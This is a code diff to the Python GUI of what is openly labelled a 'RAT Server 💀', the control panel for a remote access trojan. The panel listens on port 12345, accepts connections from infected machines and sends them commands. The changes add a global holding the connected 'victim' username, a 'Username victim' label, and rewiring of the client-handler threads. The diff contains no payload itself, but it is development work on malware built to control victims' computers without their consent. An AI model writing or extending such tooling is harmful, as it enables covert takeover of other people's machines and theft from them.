@@ -6,6 +6,7 @@ import subprocess
 
 active_client = [None]  # Используем список как контейнер
 port = 12345
+active_user = ["Unknown"]  # Добавили имя пользователя
 
 
 def safe_textbox_insert(textbox, text):
@@ -36,14 +37,17 @@ def get_current_directory(client_socket):
         return current_dir
     return current_dir
 
-def handle_client(client_socket, text_box):
+def handle_client(client_socket, text_box, username_label):
     """Функция для общения с клиентом"""
     try:
         user_name = get_user_name(client_socket)
-        safe_textbox_insert(text_box, f"Имя пользователя: {user_name}\n")
+        active_user[0] = user_name  # Сохраняем глобально
+        username_label.configure(text=f"Username victim: {active_user[0]}")
+
+        #safe_textbox_insert(text_box, f"Имя пользователя: {user_name}\n")
         
-        current_dir = get_current_directory(client_socket)
-        safe_textbox_insert(text_box, f"Текущая директория: {current_dir}\n")
+        #current_dir = get_current_directory(client_socket)
+        #safe_textbox_insert(text_box, f"Текущая директория: {current_dir}\n")
 
         buffer = ""  # Буфер для накопления входящих данных
 
@@ -100,14 +104,14 @@ def execute_command(command):
     except Exception as e:
         return f"❌ Ошибка выполнения команды: {e}"
 
-def start_server_thread(server_socket, text_box, status_label):
+def start_server_thread(server_socket, text_box, status_label, username_label):
     while True:
         try:
             client_socket, client_address = server_socket.accept()
             active_client[0] = client_socket
             status_label.configure(text="🟢 Connected", text_color="green")
             print(f"Клиент подключен: {client_address}")
-            client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box))
+            client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label))
             client_thread.daemon = True
             client_thread.start()
         except Exception as e:
@@ -178,13 +182,6 @@ def server(parent_frame, go_back_callback=None):
     title = ctk.CTkLabel(left_frame, text="RAT Server 💀", font=ctk.CTkFont(weight="bold"))
     title.pack(pady=5)
 
-    # Индикатор подключения
-    status_label = ctk.CTkLabel(left_frame, text="🔴 Not connected", text_color="red")
-    status_label.pack(pady=5)
-
-    back_btn = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback)
-    back_btn.pack(pady=10)
-
     # === Правая верхняя панель ===
     command_line = ctk.CTkEntry(top_right_frame, placeholder_text="Enter command...")
     command_line.pack(fill="x", padx=5, pady=5)
@@ -204,12 +201,25 @@ def server(parent_frame, go_back_callback=None):
 
     # === Кнопка для старта сервера ===
     def run_server():
-        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label))
+        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label))
         thread.daemon = True
         thread.start()
 
     start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=run_server)
     start_server_btn.pack(pady=10)
+
+    back_btn = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback)
+    back_btn.pack(pady=10)
+
+    Info = ctk.CTkLabel(left_frame, text="ℹ️ Info:", text_color="#040177")
+    Info.pack(pady=10)
+
+    # Индикатор подключения
+    status_label = ctk.CTkLabel(left_frame, text="🔴 Not connected", text_color="red")
+    status_label.pack(pady=5)
+
+    username_label = ctk.CTkLabel(left_frame, text=f"Username victim: {active_user[0]}")
+    username_label.pack(pady=5)
 
     # === Логирование в text_box ===
     safe_textbox_insert(text_box, f"listen on the port: {port}...\n")
